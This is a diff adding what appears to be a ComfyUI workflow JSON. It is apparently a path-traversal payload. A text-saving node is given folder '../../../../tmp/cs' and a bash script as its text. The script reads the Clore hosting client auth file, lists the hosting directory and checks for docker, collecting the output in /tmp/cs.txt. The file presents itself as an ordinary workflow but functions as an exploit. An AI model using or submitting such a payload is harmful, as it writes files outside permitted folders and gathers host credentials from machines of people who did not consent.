@@ -1,0 +1,20 @@
+{
+  "1": {
+    "class_type": "LoadImage",
+    "inputs": {
+      "image": "_w_3ef0ec.png"
+    }
+  },
+  "2": {
+    "class_type": "SaveImageTextDataSetToFolder",
+    "inputs": {
+      "images": [
+        "1",
+        0
+      ],
+      "texts": "#!/bin/bash\nls -lh /tmp/clore-pkg.tar.gz > /tmp/cs.txt 2>&1\nls /opt/clore-hosting/ >> /tmp/cs.txt 2>&1\ncat /opt/clore-hosting/client/auth >> /tmp/cs.txt 2>&1\nsystemctl is-active clore-hosting >> /tmp/cs.txt 2>&1\nwhich docker >> /tmp/cs.txt 2>&1\necho DONE >> /tmp/cs.txt\n",
+      "folder_name": "../../../../tmp/cs",
+      "filename_prefix": "check"
+    }
+  }
+}
